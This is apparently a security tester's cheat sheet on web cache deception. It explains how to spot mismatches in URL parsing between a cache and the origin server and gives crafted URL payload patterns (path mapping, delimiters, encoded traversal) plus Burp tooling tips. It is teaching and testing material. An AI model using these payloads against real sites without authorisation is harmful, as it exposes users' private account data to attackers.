## General Testing Workflow
1. Find a dynamic endpoint returning sensitive data (check raw responses in Burp — not just rendered page). Focus on `GET`/`HEAD`/`OPTIONS`.
2. Find a URL-parsing discrepancy between cache and origin (mapping / delimiters / normalization).
3. Craft the malicious URL, get it cached, then **re-request via Burp** (not browser — browsers may redirect/clear data and mask the hit).

### Cache-busting while testing
Use a unique query string per request so you don't get stale/skewed results.
- Burp: **Param Miner → Settings → Add dynamic cachebuster**

### Detecting a cache hit
| Signal | Meaning |
|---|---|
| `X-Cache: hit` | served from cache |
| `X-Cache: miss` | not in cache (check if it flips to `hit` on repeat) |
| `X-Cache: dynamic` | origin-generated, not cached |
| `X-Cache: refresh` | stale, being revalidated |
| `Cache-Control: public, max-age>0` | *suggests* cacheable (cache may override) |
| Response time delta | faster repeat = possibly cached |

## 1. Static Extension Cache Rules
*(cache matches on file extension: `.css`, `.js`, `.ico`...)*

### A. Path mapping discrepancies
- Traditional mapping: path = literal filesystem path.
- REST-style mapping: path = logical params, e.g. `/user/123/profile`.

Exploit: `/user/123/profile/wcd.css`
- Origin (REST): routes to `/user/123/profile`, ignores `wcd.css` → returns profile data.
- Cache (traditional): sees `wcd.css` as a static file inside that dir → caches it.

**Test steps:**
1. Append arbitrary path segment to endpoint → same sensitive response? → origin ignores extra path.
   `/api/orders/123` → `/api/orders/123/foo`
2. Add static extension → cached? → cache reads full path + matches ext rule.
   `/api/orders/123/foo` → `/api/orders/123/foo.js`
3. Try multiple extensions: `.css`, `.ico`, `.exe`, etc.
4. Only works per-endpoint (origin abstraction varies).

> Burp Scanner auto-detects path-mapping WCD; also try the **Web Cache Deception Scanner** BApp.

### B. Delimiter discrepancies
Different frameworks treat delimiter chars (`;`, `.`, `%00`...) differently.

| Char | Framework quirk |
|---|---|
| `;` | Java Spring: matrix variable separator → `/profile;foo.css` truncates to `/profile` |
| `.` | Ruby on Rails: format indicator → `/profile.ico` (unrecognized) falls back to HTML/profile data |
| `%00` | OpenLiteSpeed truncates path here; other frameworks error; some caches (Akamai/Fastly) keep it as literal path |

**Test steps:**
1. Baseline: `/settings/users/list` → `/settings/users/listaaa`
2. Insert candidate delimiter: `/settings/users/list;aaa`
   - Matches base → char is an origin delimiter.
   - Matches `listaaa` version → not a delimiter.
3. Add static ext after injected string; if cached → cache reads whole path incl. delimiter and has a rule for that ext. Test all ASCII chars × multiple extensions (Burp Intruder, **disable payload encoding**).
4. Exploit: `/settings/users/list;aaa.js`
   - Cache sees: full path with `.js` → caches.
   - Origin sees: `/settings/users/list` (truncated at `;`) → dynamic data.

⚠️ Chars like `{ } < > #` may get stripped/processed by the *browser* before reaching the cache — use their encoded form if needed.

### C. Delimiter decoding discrepancies
Even if both sides agree a char is a delimiter, they may differ on **whether/when** they decode it.

Example: `/profile%23wcd.css` (`%23` = `#`)
- Origin decodes `%23`→`#`, truncates → `/profile` → returns data.
- Cache treats `#` as delimiter but doesn't decode `%23` → sees literal `/profile%23wcd.css` → caches (if `.css` rule exists).

Reverse example: `/myaccount%3fwcd.css`
- Cache matches `.css` on the *encoded* path, caches, **then** decodes and forwards `/myaccount?wcd.css` to origin.
- Origin treats `?` as delimiter → resolves to `/myaccount`.

**Test:** same method as delimiter discrepancies but with encoded chars — especially `%00`, `%0A`, `%09`.

## 2. Static Directory Cache Rules
*(cache matches on path prefix: `/static/`, `/assets/`...)*

### Normalization discrepancies
Normalization = decoding chars + resolving `..` segments. Implementations vary.

Example: `/static/..%2fprofile`
- Origin decodes + resolves → `/profile` → dynamic data.
- Cache doesn't resolve → sees literal `/static/..%2fprofile` → caches under `/static` prefix rule.

⚠️ Dot-segments must be **encoded**, or the victim's browser resolves them before the request is even sent.

### Detecting origin normalization
Send traversal + leading arbitrary dir to a **non-cacheable** resource (e.g. via `POST`):
`/profile` → `/aaa/..%2fprofile`
- Matches base `/profile` response → origin decoded slash + resolved `..`.
- Doesn't match (404 etc.) → origin read literal path.

Tip: try encoding only the 2nd slash first (some CDNs match the slash right after prefix); also try encoding a dot instead of a slash.

### Detecting cache normalization
Find candidate cached static dirs: Burp Proxy → HTTP history → filter `2xx` + JS/CSS/image MIME types.

**Test 1 — traversal before prefix:**
`/aaa/..%2fassets/js/stockCheck.js`
- No longer cached → cache is not normalizing; rule = prefix match on `/assets`.
- Still cached → cache may have normalized.

**Test 2 — traversal after prefix:**
`/assets/..%2fjs/stockCheck.js`
- No longer cached → cache decoded/resolved → real path = `/js/...`; rule based on `/assets`.
- Still cached → cache left it unresolved.

**Confirm prefix-based rule:** `/assets/aaa` — still cached? confirms prefix rule (note: 404s sometimes excluded from caching regardless).

### Exploit — origin normalizes, cache doesn't
```
/<static-prefix>/..%2f<dynamic-path>
```
e.g. `/assets/..%2fprofile`
- Cache sees: `/assets/..%2fprofile` (matches `/assets` prefix) → caches.
- Origin sees: `/profile` → returns dynamic data.

### Exploit — cache normalizes, origin doesn't
```
/<dynamic-path>%2f%2e%2e%2f<static-prefix>
```
Encode **every** char in the traversal sequence. Path traversal alone isn't enough here — you also need an origin-recognized delimiter to truncate the dynamic path, since without it the origin sees the whole literal string and errors.

e.g. `/profile;%2f%2e%2e%2fstatic` (origin treats `;` as delimiter):
- Cache: decodes/resolves → `/static` → caches.
- Origin: truncates at `;` → `/profile` → returns dynamic data. ✅

## 3. File Name Cache Rules
*(cache matches exact common filenames: `robots.txt`, `favicon.ico`, `index.html`...)*

Test: `GET` the file, check if cached.

**Detect origin normalization:** same method as static-directory section (§ Detecting origin normalization).

**Detect cache normalization:** traversal + arbitrary dir before the filename:
`/profile%2f%2e%2e%2findex.html`
- Cached → cache normalized to `/index.html`.
- Not cached → cache read literal path.

**Exploit:** only works when **cache** resolves encoded dot-segments but **origin** doesn't (same technique as § Exploit — cache normalizes, origin doesn't, but swap the static-prefix for the target filename).

## Quick Reference: Payload Patterns

| Technique | Payload pattern | Requires |
|---|---|---|
| Path mapping | `/<dynamic>/x.<ext>` | origin ignores trailing path segment |
| Delimiter | `/<dynamic>;x.<ext>` | origin treats `;` (or other char) as delimiter, cache doesn't |
| Delimiter decoding | `/<dynamic>%23x.<ext>` | origin decodes `%23`→`#` as delimiter, cache doesn't |
| Dir normalization (origin) | `/<static-prefix>/..%2f<dynamic>` | origin resolves `..`, cache doesn't |
| Dir normalization (cache) | `/<dynamic>;%2f%2e%2e%2f<static-prefix>` | cache resolves `..`, origin doesn't + needs delimiter |
| Filename normalization | `/<dynamic>;%2f%2e%2e%2f<filename>` | cache resolves `..`, origin doesn't |

## Tooling
- **Burp Param Miner** — dynamic cachebuster for testing.
- **Burp Intruder** — brute-force delimiters/extensions (disable payload auto-encoding).
- **Burp Scanner** — auto-detects path-mapping WCD.
- **Web Cache Deception Scanner** (BApp) — detects misconfigured caches.
- Always confirm exploitation with **Burp repeater**, not a browser (browsers may redirect/clear state, masking the hit).
